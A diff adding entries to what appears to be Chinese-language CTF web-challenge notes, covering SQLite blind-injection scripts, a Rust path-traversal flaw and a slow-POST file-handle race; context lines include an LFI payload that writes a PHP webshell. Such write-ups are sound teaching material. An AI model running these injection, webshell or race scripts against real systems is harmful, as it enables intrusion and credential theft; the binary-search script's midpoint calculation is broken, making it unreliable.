@@ -1444,3 +1444,192 @@ include $_REQUEST['file'];
 curl "http://example.com/?page=/usr/local/lib/php/pearcmd&+-c+/tmp/webshell.php+-d+man_dir=<?echo(system(\$_GET\['cmd'\]));?>+-s+"
 curl "http://example.com/?page=/tmp/webshell&cmd=cat+/flag.txt"
 ```
+200. [Logical](https://github.com/tamuctf/tamuctf-2023/tree/master/web/logical)
+- sqlite布尔盲注（注意与sql区分，两者很像但脚本不能套用）。
+  - 使用LIKE语句。注意`_`符号在sqlite like中匹配任意一个字符，所以要放在字符集最后或是转义。https://stackoverflow.com/questions/7323162/sqlite-like-and
+```python
+import requests
+import string
+target = ''
+alphabet = string.ascii_letters + string.digits + '{$}#!?<>=*+.(),@^-_'
+flag = list('flag{')
+while flag[-1] != '}':
+    for char in alphabet:
+        r = requests.post(target, data={'username': f'admin\' and PASSWORD LIKE BINARY "{"".join(flag)}{char}%"-- '}) 
+        if 'not exists' not in r.text:
+            flag.append(char)
+            print(''.join(flag))
+            break
+```
+- 判断注入目标使用了哪些字符。[escape](https://blog.csdn.net/ameyume/article/details/8007149) 表示转义，直接用反斜杠也行。
+```python
+def enumerate_characters(charset=printable):
+    used_charset = ""
+    for char in charset:
+        payload = f"admin' and password like '%|{char}%' escape '|"
+        response = requests.post(URL, data={"username" : payload})
+        
+        if response.status_code == 200 and response.json()['res'] == 'exists':
+            used_charset += char
+       
+    return used_charset
+```
+  - 多线程([concurrent.futures](https://python-parallel-programmning-cookbook.readthedocs.io/zh_CN/latest/chapter4/02_Using_the_concurrent.futures_Python_modules.html))LIKE并转义特殊符号
+```python
+import string
+import urllib.parse
+import concurrent.futures
+import requests
+
+session = requests.Session()
+FLAG = "flag{"
+
+def validate_current_password(char):
+    # escape characters used by SQL's LIKE operator
+    if char == "%":
+        char = "\%"
+    elif char == "_":
+        char = "\_"
+    
+    # setting up request
+    url = f""
+    headers = { "Content-Type": "application/x-www-form-urlencoded" }
+    user_input = "admin' AND password LIKE '" + FLAG + char + "%';"
+    data = f"username={urllib.parse.quote(user_input)}"
+    response = session.post(url, headers=headers, data=data)
+    
+    # not exists
+    if response.status_code != 200:
+        return None
+    
+    content = response.json()["res"]
+    if content != "exists":
+        return None
+    
+    # exists
+    return char
+
+
+added = True # check to stop loop when looped all ASCII characters and did not append to flag
+# brute force
+while not FLAG.endswith("}") and added == True:
+    added = False
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        futures = [executor.submit(validate_current_password, c) for c in string.printable]
+        for future in concurrent.futures.as_completed(futures):
+            result = future.result()
+            if result == None:
+                continue
+            FLAG += result
+            added = True
+            print(FLAG)
+            executor.shutdown(wait=True, cancel_futures=True)
+            break
+        
+    if added == False:
+        break
+
+print(f"Final flag: {FLAG}")
+print("Done")
+```
+  - 使用SUBSTRING+ascii+二分法
+```python
+import requests
+import string
+
+host="" #challange server
+
+false_data = {
+        "username":"payload"
+}
+res = requests.post(host,data=false_data)
+false_data = res.json()['res']
+
+burteforce_string = string.printable
+
+def sqli(pos,char):
+    data = {
+        "username":"admin' and ascii(SUBSTRING((SELECT password FROM users WHERE Username = 'admin'), %d, 1)) > %d#"%(pos,char)
+    }
+    r = requests.post(host,data=data)
+    print(data, r.text)
+    result = r.json()['res']
+
+    
+    return  result != false_data
+
+def get_char(pos):
+    lo, hi = 32, 128
+    while lo <= hi: #calculating the first mid
+        mid = lo + (hi - lo) 
+        if sqli(pos, mid): 
+            lo = mid + 1
+        else:
+            hi = mid - 1
+    print(lo)
+    return chr(lo)
+
+blacklist_char = "'\""
+flag = ''
+for pos in range(10, 64):
+    flag += get_char(pos)
+    print("flag",flag)
+```
+
+201. [Flag Fetcher](https://astr.cc/blog/tamuctf-2023-writeup/#flag-fetcher)
+- rust [actix-web](https://web.veaba.me/rust/actix-web/)入门。
+```rs
+#[get("/flag")]
+async fn get_flag(){}
+```
+
+可以创建一个名为/flag的路由，内部逻辑在get_flag函数中定义。但光定义路由是不够的，还需要将该路由加到App中。如果不加会导致404。
+```rs
+HttpServer::new(move || {
+    App::new()
+        .service(get_flag)
+})
+```
+- PathBuf extend函数的错误使用。
+```rs
+#[get("/static/{filename:.*}")]
+async fn static_files(req: HttpRequest) -> Result<fs::NamedFile, Error> {
+    let requested: PathBuf = req.match_info().query("filename").parse()?;
+    let requested: PathBuf = requested
+        .components()
+        .filter(|&entry| entry != Component::ParentDir)
+        .collect();
+
+    let mut path = PathBuf::from_str("static").unwrap();
+    path.extend(&requested);
+
+    let file = fs::NamedFile::open(path)?;
+    Ok(file.use_last_modified(true))
+}
+```
+代码使用[PathBuf](https://rustwiki.org/zh-CN/std/path/struct.PathBuf.html )过滤掉`../`，但后续又用extend拼接上用户可控制的filename。extend的[内部](https://doc.rust-lang.org/1.69.0/src/std/path.rs.html#1755-1757)调用了push，而push在遇到绝对路径参数时会替代已有的path，导致路径穿越。因此只需访问`http://example.com/static//key`即可访问根目录下的key文件。
+
+202. [Web LTO](https://astr.cc/blog/tamuctf-2023-writeup/#web-lto)
+- 重用文件描述符（reuse file handles/descriptors)的风险。此题实现了下面的逻辑：
+    - 用户上传文件，服务器在tmp下打开一个文件
+    - seek到temp文件的开头，将内容用tar打包后返回，删除原本文件
+漏洞点在于服务器在打开文件时没有考虑重名的问题。假设我们发送了一个持续十秒的post请求，此时有机器人上传flag.txt文件。服务器先打开了代表我们的文件的r+w文件句柄，同时因为文件重名导致服务器重用该文件句柄导致机器人上传的flag覆盖了空白文件。就算后续机器人删除了文件，但我们仍持有r+w的文件句柄，还是可以读文件。
+- python实现慢速post。
+```python
+import requests, time
+
+def generator():
+    print("sending multipart header...")
+    yield b"--boundary\r\nContent-Disposition: form-data; name=\"a\"; filename=\"flag.txt\"\r\n\r\n"
+
+    print("sleeping...")
+    time.sleep(15)
+
+    print("finishing request...")
+    yield b"\r\n--boundary--\r\n"
+
+r = requests.post("http://example.com", headers={
+    "Content-Type": "multipart/form-data; boundary=boundary"
+}, data=generator(), cookies={"whoami": "nobody"})
+print(r.text)
+```
